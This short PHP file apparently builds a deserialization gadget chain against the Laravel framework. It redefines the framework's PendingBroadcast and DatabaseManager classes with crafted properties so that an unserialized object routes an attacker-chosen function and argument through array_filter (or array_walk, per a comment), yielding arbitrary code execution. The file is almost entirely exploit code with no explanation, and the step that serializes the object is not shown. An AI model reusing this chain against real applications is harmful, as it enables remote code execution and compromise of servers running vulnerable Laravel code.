<?php

namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        protected $events;

        function __construct($function,$paramter)
        {
            $this->events = new \Illuminate\Database\DatabaseManager($function,$paramter);
        }
    }
}

namespace Illuminate\Database{
    class DatabaseManager{
        protected $app;
        protected $extensions;
        
        function __construct($function,$paramter)
        {
            $this->app = array("config"=>array("database.default"=>$function,"database.connections"=>array($function=>array($paramter))));
            $this->extensions[$function] = "array_filter";//or array_walk
        }
    }
}
